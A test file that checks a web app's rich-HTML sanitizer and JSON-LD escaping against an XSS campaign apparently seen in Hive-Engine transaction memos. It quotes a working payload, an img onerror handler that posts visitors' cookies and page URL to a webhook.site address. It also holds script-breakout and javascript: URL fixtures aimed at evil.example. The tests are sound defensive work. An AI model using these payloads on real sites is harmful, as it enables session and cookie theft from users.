import { describe, expect, it } from 'vitest'
import { sanitizeRichHtml } from '../../src/utils/safeRichHtml'
import {
  firstImage,
  normalizeImageUrl,
  rewriteHead,
  scriptJson
} from '../../deploy/cloudflare/metadata-worker.mjs'
import { safeJsonLd } from '../../scripts/lib/prerender-meta.mjs'

// Transaction 3523249b18d4f361a8ca46bc872a2bd1070c6b91 (2026-11-25 00:55:21
// UTC) carried this in a Hive-Engine memo. Any front-end that renders the memo
// as HTML would run it in the origin of the wallet/POS app and post the
// visitor's cookies and storage to the webhook.
const CAMPAIGN_MEMO =
  '<img src=x onerror="(async function(){var o={h:location.href,c:document.cookie};' +
  "fetch('https://webhook.site/8a6a0c5f-9033-457c-a10a-0754c635696b'," +
  "{method:'POST',mode:'no-cors',body:JSON.stringify(o)})})()\"> TABLE 6  mil-inno-w4xe-u5jj"

const BREAKOUT = 'https://evil.example/</script><script>alert(document.domain)</script>'

describe('Hive memo XSS family', () => {
  it('neutralises the reported memo payload before v-html', () => {
    const clean = sanitizeRichHtml(CAMPAIGN_MEMO)

    expect(clean).toContain('<img')
    expect(clean).not.toMatch(/onerror/i)
    expect(clean).not.toContain('webhook.site')
  })

  it('neutralises a base64 n: note payload after decoding', () => {
    const note = 'd:24,n:' + Buffer.from(CAMPAIGN_MEMO, 'utf8').toString('base64')
    const decoded = Buffer.from(note.split(',n:')[1], 'base64').toString('utf8')
    const clean = sanitizeRichHtml(decoded)

    expect(clean).not.toMatch(/onerror|webhook\.site/i)
  })

  it('leaves javascript: links inert', () => {
    expect(sanitizeRichHtml('<a href="javascript:alert(1)">x</a>')).not.toMatch(/javascript:/i)
  })

  it('drops forms from rich text', () => {
    expect(
      sanitizeRichHtml('<form action="https://evil.example"><input name="x"></form>')
    ).not.toMatch(/<form/i)
  })
})

describe('metadata worker JSON-LD', () => {
  it('escapes < so chain-controlled URLs cannot close the script block', () => {
    const json = scriptJson({ image: [BREAKOUT] })

    expect(json).not.toContain('</script>')
    expect(json).toContain('\\u003c/script')
  })

  it('normalises image URLs and rejects non-http schemes', () => {
    expect(normalizeImageUrl(BREAKOUT)).not.toContain('<')
    expect(normalizeImageUrl('javascript:alert(1)')).toBe('')
    expect(normalizeImageUrl('data:text/html,<script>alert(1)</script>')).toBe('')
    expect(firstImage({ image: [BREAKOUT] })).not.toContain('<')
  })

  it('injects exactly one inert JSON-LD script through rewriteHead', () => {
    const shell =
      '<html><head><title>t</title></head><body>' +
      '<main data-seo-shell><h1>x</h1><p>y</p></main></body></html>'

    const out = rewriteHead(shell, {
      title: 't',
      description: 'd',
      image: BREAKOUT,
      type: 'article',
      path: '/@a/b',
      jsonLd: { image: [BREAKOUT] }
    })

    expect(out).not.toContain('</script><script>')
    expect(out).toContain('application/ld+json')
    expect(out.match(/<script/gi) || []).toHaveLength(1)
  })
})

describe('prerender JSON-LD injection', () => {
  it('escapes < in caller-supplied JSON-LD text and objects', () => {
    expect(safeJsonLd('{"image":"' + BREAKOUT + '"}')).not.toContain('</script>')
    expect(safeJsonLd({ image: [BREAKOUT] })).not.toContain('</script>')
    expect(safeJsonLd({ image: [BREAKOUT] })).toContain('\\u003c')
  })
})
